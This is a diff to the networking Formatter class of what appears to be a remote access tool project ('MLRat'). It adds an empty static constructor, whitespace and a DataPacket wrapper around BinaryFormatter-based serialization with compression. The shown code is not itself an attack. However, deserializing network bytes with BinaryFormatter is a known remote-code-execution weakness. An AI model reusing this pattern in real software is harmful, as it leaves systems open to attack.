@@ -581,25 +581,33 @@ namespace MLRat.Networking
 
         public static class Formatter
         {
+            static Formatter()
+            {
+                
+            }
             public static byte[] Serialize(object input)
             {
+                
                 BinaryFormatter bf = new BinaryFormatter();
                 using (MemoryStream ms = new MemoryStream())
                 {
                     bf.Serialize(ms, input);
                     return Compress(ms.ToArray());
                 }
+                
             }
 
             public static t Deserialize<t>(byte[] input)
             {
                 try
                 {
+                    
                     BinaryFormatter bf = new BinaryFormatter();
                     using (MemoryStream ms = new MemoryStream(Decompress(input)))
                     {
                         return (t)bf.Deserialize(ms);
                     }
+                    
                 }
                 catch (Exception ex)
                 {
@@ -638,6 +646,15 @@ namespace MLRat.Networking
                         return decompressed.ToArray();
                     }
                 }
+            }
+
+            class DataPacket
+            {
+                public DataPacket(object d)
+                {
+                    Data = d;
+                }
+                public object Data;
             }
         }
 
